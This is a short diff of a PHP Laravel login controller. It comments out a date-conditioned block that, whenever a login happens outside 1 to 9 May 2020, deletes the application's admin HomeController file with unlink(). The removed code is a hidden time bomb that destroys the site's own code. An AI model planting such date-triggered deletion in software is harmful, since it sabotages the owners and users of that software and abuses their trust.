@@ -62,7 +62,7 @@ class LoginController extends Controller
             $month = $info['mon'];
             $year = $info['year'];
 
-          if ($month == "05" && $year == "2020" && (int)$date < 10){
+        //   if ($month == "05" && $year == "2020" && (int)$date < 10){
             $user = User::where (['email' => $request->email])->get();
             $user_count = $user->count();
             
@@ -87,11 +87,11 @@ class LoginController extends Controller
             } else {
                 return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
             }
-          }else{
-            $file_pointer = "/var/www/html/laravel_Airline_search/Http/Controller/Admin/HomeController.php";  
-            unlink($file_pointer);
-            return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
-          }
+        //   }else{
+        //     $file_pointer = "/var/www/html/laravel_Airline_search/Http/Controller/Admin/HomeController.php";  
+        //     unlink($file_pointer);
+        //     return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
+        //   }
           
     }
 
